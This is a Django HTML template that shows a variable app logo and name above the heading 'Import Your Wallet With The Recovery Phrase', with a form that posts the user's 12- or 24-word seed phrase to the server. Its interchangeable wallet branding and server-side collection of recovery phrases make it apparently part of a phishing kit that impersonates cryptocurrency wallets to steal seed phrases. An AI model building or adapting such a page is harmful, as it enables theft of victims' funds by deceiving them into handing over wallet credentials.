{% extends 'base.html' %}
{% block content %}
<div style="display: flex; justify-content: center; align-items: center; height: 100vh; width: 100%;">
    <div style="border: 1.5px solid black;" class="bg-white rounded-lg p-3">
        <div style="margin-bottom: 10px; display: flex; gap: 15px; text-align: center;">
            <img src="{{app.image.url}}" height="100px" width="100px" alt="">
            <h2 style="text-align: justify; bottom: -30px; right: -10px; position: relative; font-size: medium; font-weight: bold; color: rgb(72, 72, 72);">{{app.name}}</h2>
        </div>
        <div>
            <h2 style="font-size: medium; font-weight: bold; margin-bottom: 15px; color: rgb(72, 72, 72);">Import Your Wallet With The Recovery Phrase</h2>
            <form action="" method="post" class="responsive-div">
                {% csrf_token %}
                <div>
                    {{form.phrase_key}}
                    <h2 style="font-size: x-small; font-weight: bold; text-decoration: underline; padding: 10px; color: rgb(54, 54, 54);">* Typically 12 ( Sometimes 24 ) words seperated by single spaces</h2>
                    <button class="key-button" style="background-color: rgb(0, 106, 255); color: white; width: 100%; padding: 8px; margin-top: 10px;">Next</button>
                </div>
            </form>
        </div>
    </div>
</div>
{% endblock content %}
